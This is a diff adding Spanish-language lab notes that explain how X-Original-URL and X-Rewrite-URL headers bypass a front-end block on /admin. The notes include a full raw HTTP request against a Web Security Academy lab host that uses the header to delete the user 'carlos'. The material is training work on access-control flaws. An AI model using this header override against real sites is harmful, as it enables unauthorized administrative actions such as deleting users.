@@ -251,5 +251,39 @@ Connection: close
 ```
 
 
+# URL-based access control can be circumvented
 
+
+Para este laboratorio el front-end tiene restringido el /admin pero el backend puede re interpretar la solicitud con ayuda de una cabezera especial
+X-Original-URL" y "X-Rewrite-URL"
+
+>Algunos marcos de aplicación admiten varios encabezados HTTP no estándar que se pueden usar para anular la URL en la solicitud original, como X-Original-URLy X-Rewrite-URL. Si un sitio web utiliza controles de front-end rigurosos para restringir el acceso en función de la URL, pero la aplicación permite anular la URL a través de un encabezado de solicitud, es posible que se eludan los controles de acceso mediante una solicitud como la siguiente:
+
+POST / HTTP/1.1
+  X-Original-URL: /admin/deleteUser
+
+
+```
+GET /?username=carlos HTTP/1.1
+Host: 0a0100c504b9ee26c086386e00fa0082.web-security-academy.net
+Cookie: session=7YZpLgyh3v5dF8GTmNeglXhETUwCZ2vl
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+Content-Length: 2
+X-Original-URL: /admin/delete
+
+```
+
+https://security.stackexchange.com/questions/229928/x-original-url-and-x-rewrite-url-related-vulnerabilities
 
